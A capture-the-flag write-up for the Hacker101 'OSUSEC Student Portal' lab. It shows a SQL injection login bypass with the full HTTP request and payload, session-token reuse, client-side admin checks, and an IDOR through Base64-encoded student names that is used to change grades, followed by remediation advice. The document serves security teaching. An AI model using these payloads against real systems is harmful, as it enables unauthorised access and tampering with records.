# 📚 OSUSEC Student Portal

> **Platform:** Hacker101 CTF &nbsp;|&nbsp; **Difficulty:** `Easy-Medium` &nbsp;|&nbsp; **Flags:** `1/1` ✅

---

## ⛓️ Attack Chain

```
Login via SQL Injection → Capture teacher's token cookie → Encode student name to Base64 → Directly access grade edit URL → Change grades → Flag captured
```

---

## 🔍 Application Overview

A student management portal where teachers can view and edit student grades. The vulnerability lies in client-side access control combined with predictable object references.

---

## 🚩 Flag — Grade Manipulation via Token Injection & IDOR

### Step 1 — Bypass Login with SQL Injection

The login form was vulnerable to SQL injection. I bypassed authentication using a classic payload:

**Request:**

```http
POST /login HTTP/1.1
Host: dd13b3db5fc36c5edf41fde91e93a957.ctf.hacker101.com
Content-Type: application/x-www-form-urlencoded

username=admin' OR '1'='1' --&password=anything
```

**Result:** Successfully logged in as `rhonda.daniels` and redirected to the dashboard.

---

### Step 2 — Capture the Teacher's Token Cookie

After successful login, the server issued a session token cookie. I extracted it from the response headers:

```http
Set-Cookie: token=NzNhYzNlM2FmODk2NjNkZjFiMzMwMjhiZWI3ZjY5ZjFiZTVkNjM4NjVhMDBjZWZiZDhmNzBjZTk1N2MwODY1ZGUyMjZkNDBlMTYxYTI5N2YxZTI4YzY0ZThhMjQ0ZjhmZDc0MzJkYThiM2EyMmQxNjhjMDdjOGY5OGM3ZDkzOTI%3D; path=/
```

This token identified me as an authenticated teacher.

---

### Step 3 — Analyze the Dashboard JavaScript

The dashboard displayed a table of students but **Natasha Drew was not listed**. The JavaScript code revealed the vulnerability:

```javascript
var staff = {
    admin   :   false,
    name    :   'rhonda.daniels'
}
```

The external script `assets/js/app.min.js` contained:

```javascript
setupLinks = function(){
    if( s.admin ){  // ← Admin check on CLIENT side
        var sl = document.getElementsByClassName("student-link");
        for (i = 0; i < sl.length; i++) {
            sl[i].addEventListener("click", function(){
                window.location = '/update-' + objectName + '/' + this.dataset.id;
            });
        }
    }
};
```

**Critical flaw:** The admin check happens in the browser, not on the server.

---

### Step 4 — Inject Token Cookie & Access Edit URL

Instead of modifying the `staff.admin` variable, I used the teacher's token cookie directly. The grade edit endpoint was accessible without admin privileges.

**Target URL structure:**

```
/update-student/[base64_encoded_student_name]
```

I encoded Natasha Drew's name:

```bash
echo -n "Natasha_Drew" | base64
```

**Output:** `TmF0YXNoYV9EcmV3`

**Full URL:**

```
https://dd13b3db5fc36c5edf41fde91e93a957.ctf.hacker101.com/update-student/TmF0YXNoYV9EcmV3
```

---

### Step 5 — Change Grades & Capture Flag

The grade edit page loaded successfully. I set all subjects to **A** and submitted.

The flag appeared immediately after submission:

```
^FLAG^7cf095fe3d1562a95054dedcf6960eb68559619fb3357bdf8d6ddb8b1411e6f4$
```

---

## 🧠 Why It Works

| Vulnerability | Root Cause |
|---|---|
| SQL Injection | Login form directly concatenated user input into SQL query |
| Client-side access control | Admin privileges were checked in JavaScript, not on the server |
| IDOR (Insecure Direct Object Reference) | `/update-student/[id]` endpoint had no server-side permission validation |
| Predictable identifiers | Student IDs were simply Base64-encoded names, easily guessable |

---

## 📋 Tools & Commands

```bash
# Encode student name to Base64
echo -n "Natasha_Drew" | base64

# Decode a data-id from the page
echo "TmFuY2llX0JyZXR0" | base64 -d
```

SQL Injection payload used:

```sql
admin' OR '1'='1' --
```

---

## 🛠️ Remediation Recommendations

| Fix | Description |
|---|---|
| Server-side session validation | Never trust client-side variables like `staff.admin` |
| Parameterized queries | Use prepared statements to prevent SQL injection |
| Access control checks | Verify user permissions on every request, especially write operations |
| Unpredictable identifiers | Use random UUIDs instead of encoded predictable values |

---

## 📝 Summary

This challenge combined multiple vulnerabilities:

1. **SQL injection** to bypass login
2. **Client-side access control** to discover the edit URL pattern
3. **IDOR** to directly access any student's grade edit page
4. **Predictable Base64 IDs** to target Natasha Drew

By injecting the teacher's token cookie and directly accessing `/update-student/TmF0YXNoYV9EcmV3`, I changed her grades to A and captured the flag without ever setting `staff.admin = true`.
